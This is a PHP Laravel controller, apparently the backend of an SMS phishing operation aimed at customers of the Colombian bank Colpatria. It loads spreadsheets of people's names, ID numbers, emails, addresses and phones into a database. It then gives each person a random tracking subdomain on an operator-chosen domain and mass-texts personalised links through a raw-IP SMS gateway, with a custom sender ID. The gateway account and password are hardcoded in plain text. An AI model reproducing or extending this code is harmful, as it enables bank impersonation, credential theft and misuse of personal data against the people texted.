<?php

namespace App\Http\Controllers;

use App\Models\DatoColpatria;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;
use PhpOffice\PhpSpreadsheet\IOFactory;
use Symfony\Component\HttpFoundation\File\UploadedFile;

class SenderColpaController extends Controller
{
    /**
     * Endpoint de envío de SMS del proveedor.
     */
    private string $smsEndpoint = 'http://8.219.42.83:20003/sendsms';

    /**
     * Credenciales de la cuenta SMPP/HTTP.
     */
    private string $account = '0093C168';
    private string $password = 'NVmCuiKUB5i';

    /**
     * Muestra el formulario de envío para Colpatria.
     */
    public function index()
    {
        return view('sender.colpatria.index');
    }

    /**
     * Procesa la carga del archivo Excel y muestra vista previa.
     */
    public function uploadFile(Request $request)
    {
        // Validación del archivo
        $request->validate([
            'excel_file' => 'required|file|mimes:xls,xlsx',
            'domain' => 'required|string',
            'message_template_excel' => 'required|string',
        ]);

        /** @var UploadedFile $file */
        $file = $request->file('excel_file');
        $domain = $this->normalizeDomain($request->input('domain'));
        $template = $request->input('message_template_excel');

        // Procesar Excel y guardar datos
        $preview = $this->processExcelFile($file, $domain, $template);

        if (empty($preview['data'])) {
            return back()
                ->withErrors(['No se encontraron datos válidos en el archivo Excel.'])
                ->withInput();
        }

        // Guardar información en sesión para el envío posterior
        session([
            'colpatria_upload' => [
                'domain' => $domain,
                'template' => $template,
                'total_records' => $preview['total'],
                'preview' => array_slice($preview['data'], 0, 5), // Solo 5 para preview
            ]
        ]);

        return view('sender.colpatria.preview', [
            'preview' => $preview,
            'domain' => $domain,
            'template' => $template,
            'sender_id' => $request->input('sender_id', ''),
            'batch_size' => $request->input('batch_size', 100),
            'batch_interval' => $request->input('batch_interval', 0),
        ]);
    }

    /**
     * Procesa el envío masivo de SMS para Colpatria.
     */
    public function send(Request $request)
    {
        // Verificar que exista una carga previa
        if (!session()->has('colpatria_upload')) {
            return redirect()
                ->route('sender.colpatria.index')
                ->withErrors(['No hay archivo cargado. Por favor, sube un archivo primero.']);
        }

        // Validación base
        $request->validate([
            'batch_size'     => 'required|integer|min:1|max:1000',
            'batch_interval' => 'required|integer|min:0',
        ]);

        $upload = session('colpatria_upload');
        $domain = $upload['domain'];
        $template = $upload['template'];
        $batchSize = (int) $request->input('batch_size', 100);
        $batchInterval = (int) $request->input('batch_interval', 0);
        $senderId = (string) $request->input('sender_id', '');

        // Obtener todos los datos de la DB que se guardaron durante la carga
        $datosColpatria = DatoColpatria::whereNotNull('token')->get();

        // Construir mensajes desde los datos guardados
        $messages = [];
        foreach ($datosColpatria as $dato) {
            if (empty($dato->celular) || empty($dato->token)) {
                continue;
            }

            // Extraer solo el primer nombre
            $primerNombre = $dato->nombre;
            if (!empty($dato->nombre)) {
                $partes = explode(' ', $dato->nombre);
                $primerNombre = $partes[0];
            }

            $link = 'https://' . $dato->token . '.' . $domain;
            $content = str_replace('{nombre}', $primerNombre, $template);
            $content = str_replace('{enlace}', $link, $content);

            $messages[] = [
                'number'  => $dato->celular,
                'content' => $content,
            ];
        }

        $total = count($messages);

        if ($total === 0) {
            return back()
                ->withErrors(['No se encontraron mensajes válidos para enviar. Revisa el Excel.'])
                ->withInput();
        }

        // Envío por lotes
        $successCount = 0;
        $failCount = 0;
        $apiResponses = [];
        $errors = [];

        $chunks = array_chunk($messages, $batchSize);

        foreach ($chunks as $batchIndex => $chunk) {
            $smsArray = [];

            foreach ($chunk as $msg) {
                $smsArray[] = [
                    'content'  => $msg['content'],
                    'smstype'  => 0,
                    'mmstitle' => '',
                    'numbers'  => $msg['number'],
                    'sender'   => $senderId,
                ];
            }

            $payload = [
                'account'  => $this->account,
                'password' => $this->password,
                'smsarray' => $smsArray,
            ];

            try {
                $response = Http::withHeaders([
                        'Content-Type' => 'application/json;charset=utf-8',
                    ])
                    ->post($this->smsEndpoint, $payload);

                if ($response->successful()) {
                    $body = $response->json();

                    $apiResponses[] = [
                        'lote' => $batchIndex + 1,
                        'status_code' => $response->status(),
                        'respuesta' => $body,
                    ];

                    $successCount += isset($body['success']) ? (int) $body['success'] : count($chunk);
                    $failCount    += isset($body['fail']) ? (int) $body['fail'] : 0;
                } else {
                    $failCount += count($chunk);
                    $errors[] = [
                        'lote' => $batchIndex + 1,
                        'error' => 'HTTP ' . $response->status(),
                        'body' => $response->body(),
                    ];
                }
            } catch (\Throwable $e) {
                $failCount += count($chunk);
                $errors[] = [
                    'lote' => $batchIndex + 1,
                    'error' => $e->getMessage(),
                ];
            }

            // Intervalo entre lotes
            if ($batchInterval > 0 && $batchIndex < count($chunks) - 1) {
                sleep($batchInterval);
            }
        }

        return redirect()
            ->route('sender.colpatria.index')
            ->withInput($request->except(['excel_file']))
            ->with('sms_result', [
                'total'   => $total,
                'success' => $successCount,
                'fail'    => $failCount,
                'api_responses' => $apiResponses,
                'errors' => $errors,
            ]);
    }

    /**
     * Normaliza el dominio.
     */
    private function normalizeDomain(string $domain): string
    {
        $domain = trim($domain);
        $domain = preg_replace('#^https?://#i', '', $domain);
        $domain = rtrim($domain, '/');

        return $domain;
    }

    /**
     * Procesa el archivo Excel, guarda los datos en la DB y retorna preview.
     */
    private function processExcelFile(UploadedFile $file, string $domain, string $template): array
    {
        $preview = [
            'data' => [],
            'total' => 0,
        ];

        $spreadsheet = IOFactory::load($file->getRealPath());
        $sheet = $spreadsheet->getActiveSheet();
        $rows = $sheet->toArray(null, true, true, true);

        if (empty($rows)) {
            return $preview;
        }

        // Primera fila = encabezados
        $headerRow = array_shift($rows);

        // Mapeo de columnas
        $columnMap = [];
        foreach ($headerRow as $col => $header) {
            $header = strtoupper(trim((string) $header));
            $columnMap[$header] = $col;
        }

        // Verificar columnas requeridas
        $requiredColumns = ['NOMBRE', 'IDENT', 'EMAIL', 'DIRRESIDENCIA', 'CIURESIDENCIA', 'DPTORESIDENCIA'];
        foreach ($requiredColumns as $required) {
            if (!isset($columnMap[$required])) {
                return $preview;
            }
        }

        // Verificar que tenga al menos una columna de teléfono
        if (!isset($columnMap['CELULAR']) && !isset($columnMap['TELRESIDENCIA'])) {
            return $preview;
        }

        foreach ($rows as $row) {
            $nombreCompleto = isset($row[$columnMap['NOMBRE']]) ? trim((string) $row[$columnMap['NOMBRE']]) : '';
            $cedula = isset($row[$columnMap['IDENT']]) ? trim((string) $row[$columnMap['IDENT']]) : '';

            // Intentar primero CELULAR, luego TELRESIDENCIA
            $celular = '';
            if (isset($columnMap['CELULAR'])) {
                $celular = isset($row[$columnMap['CELULAR']]) ? trim((string) $row[$columnMap['CELULAR']]) : '';
            }
            if (empty($celular) && isset($columnMap['TELRESIDENCIA'])) {
                $celular = isset($row[$columnMap['TELRESIDENCIA']]) ? trim((string) $row[$columnMap['TELRESIDENCIA']]) : '';
            }

            $email = isset($row[$columnMap['EMAIL']]) ? trim((string) $row[$columnMap['EMAIL']]) : '';
            $direccion = isset($row[$columnMap['DIRRESIDENCIA']]) ? trim((string) $row[$columnMap['DIRRESIDENCIA']]) : '';
            $ciudad = isset($row[$columnMap['CIURESIDENCIA']]) ? trim((string) $row[$columnMap['CIURESIDENCIA']]) : '';
            $departamento = isset($row[$columnMap['DPTORESIDENCIA']]) ? trim((string) $row[$columnMap['DPTORESIDENCIA']]) : '';

            if ($celular === '') {
                continue;
            }

            // Extraer solo el primer nombre
            $primerNombre = $nombreCompleto;
            if (!empty($nombreCompleto)) {
                $partes = explode(' ', $nombreCompleto);
                $primerNombre = $partes[0];
            }

            // Generar token aleatorio
            $token = Str::lower(Str::random(6));
            $link = 'https://' . $token . '.' . $domain;

            // Guardar o actualizar datos en la DB con el token (guardamos el nombre completo)
            DatoColpatria::updateOrCreate(
                ['celular' => $celular],
                [
                    'nombre' => $nombreCompleto,
                    'cedula' => $cedula,
                    'token' => $token,
                    'email' => $email,
                    'direccion' => $direccion,
                    'ciudad' => $ciudad,
                    'departamento' => $departamento,
                ]
            );

            // Reemplazar {nombre} y {enlace} en el mensaje (usamos solo el primer nombre)
            $content = str_replace('{nombre}', $primerNombre, $template);
            $content = str_replace('{enlace}', $link, $content);

            $preview['data'][] = [
                'nombre' => $primerNombre,
                'celular' => $celular,
                'mensaje' => $content,
                'enlace' => $link,
            ];
        }

        $preview['total'] = count($preview['data']);

        return $preview;
    }

    /**
     * Construye los mensajes a partir del Excel y guarda datos en la DB.
     * @deprecated Usar processExcelFile en su lugar
     */
    private function buildMessagesFromExcel(UploadedFile $file, string $domain, string $template): array
    {
        $messages = [];

        $spreadsheet = IOFactory::load($file->getRealPath());
        $sheet = $spreadsheet->getActiveSheet();
        $rows = $sheet->toArray(null, true, true, true);

        if (empty($rows)) {
            return $messages;
        }

        // Primera fila = encabezados
        $headerRow = array_shift($rows);

        // Mapeo de columnas
        $columnMap = [];
        foreach ($headerRow as $col => $header) {
            $header = strtoupper(trim((string) $header));
            $columnMap[$header] = $col;
        }

        // Verificar columnas requeridas
        $requiredColumns = ['NOMBRE', 'IDENT', 'TELRESIDENCIA', 'EMAIL', 'DIRRESIDENCIA', 'CUIRESIDENCIA', 'DPTORESIDENCIA'];
        foreach ($requiredColumns as $required) {
            if (!isset($columnMap[$required])) {
                return $messages;
            }
        }

        foreach ($rows as $row) {
            $nombre = isset($row[$columnMap['NOMBRE']]) ? trim((string) $row[$columnMap['NOMBRE']]) : '';
            $cedula = isset($row[$columnMap['IDENT']]) ? trim((string) $row[$columnMap['IDENT']]) : '';
            $celular = isset($row[$columnMap['TELRESIDENCIA']]) ? trim((string) $row[$columnMap['TELRESIDENCIA']]) : '';
            $email = isset($row[$columnMap['EMAIL']]) ? trim((string) $row[$columnMap['EMAIL']]) : '';
            $direccion = isset($row[$columnMap['DIRRESIDENCIA']]) ? trim((string) $row[$columnMap['DIRRESIDENCIA']]) : '';
            $ciudad = isset($row[$columnMap['CUIRESIDENCIA']]) ? trim((string) $row[$columnMap['CUIRESIDENCIA']]) : '';
            $departamento = isset($row[$columnMap['DPTORESIDENCIA']]) ? trim((string) $row[$columnMap['DPTORESIDENCIA']]) : '';

            if ($celular === '') {
                continue;
            }

            // Generar token aleatorio
            $token = Str::lower(Str::random(6));
            $link = 'https://' . $token . '.' . $domain;

            // Guardar o actualizar datos en la DB con el token
            DatoColpatria::updateOrCreate(
                ['celular' => $celular],
                [
                    'nombre' => $nombre,
                    'cedula' => $cedula,
                    'token' => $token,
                    'email' => $email,
                    'direccion' => $direccion,
                    'ciudad' => $ciudad,
                    'departamento' => $departamento,
                ]
            );

            // Reemplazar {nombre} y {enlace} en el mensaje
            $content = str_replace('{nombre}', $nombre, $template);
            $content = str_replace('{enlace}', $link, $content);

            $messages[] = [
                'number'  => $celular,
                'content' => $content,
            ];
        }

        return $messages;
    }
}
